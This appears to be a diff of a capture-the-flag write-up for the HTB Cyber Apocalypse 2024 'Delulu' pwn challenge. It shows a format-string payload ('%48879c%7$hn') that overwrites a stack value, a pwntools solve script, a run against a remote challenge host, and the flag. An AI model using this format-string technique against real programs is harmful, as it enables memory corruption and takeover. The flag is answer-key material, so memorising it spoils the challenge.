@@ -1,9 +1,11 @@
-# Delulu - pwn
-#### HTB Cyber Apocalypse
+# Delulu
+#### HTB Cyber Apocalypse 2024
 
-#format-string
+***Category:*** pwn
+***Description:*** "HALT! Recognition protocol initiated. Please present your face for scanning."
+***Tags***: #format-string
 ## Initial Analysis
-Opening this up in Ghidra, we are greeted with this in the decompilation view.
+Opening this up in Ghidra, we are greeted with this in the decomp view.
 ``` c
 local_48 = 0x1337babe;
 local_40 = &local_48;
@@ -101,8 +103,13 @@ So we want the positional to be 7.
 
 Combining those two concepts we get `%48879c%7$hn`
 
-### Solve Script
 ```
+python3 solve.py -r 94.237.62.195:36448
+...
+You managed to deceive the robot, here's your new identity: HTB{m45t3r_0f_d3c3pt10n}
+```
+## Solve Script
+``` python
 from pwn import *
 from ctfkit.bp import *
 
@@ -114,7 +121,6 @@ tpwn.HOST = ""
 tpwn.GDB_SCRIPT = ""
 
 def main():
-  parse_args()
   proc = get_process()
 
   format_string = "%48879c%7$hn"
@@ -122,5 +128,7 @@ def main():
   proc.interactive()
 
 if __name__ == '__main__':
+  parse_args()
   main()
 ```
+##### Flag: `HTB{m45t3r_0f_d3c3pt10n}`
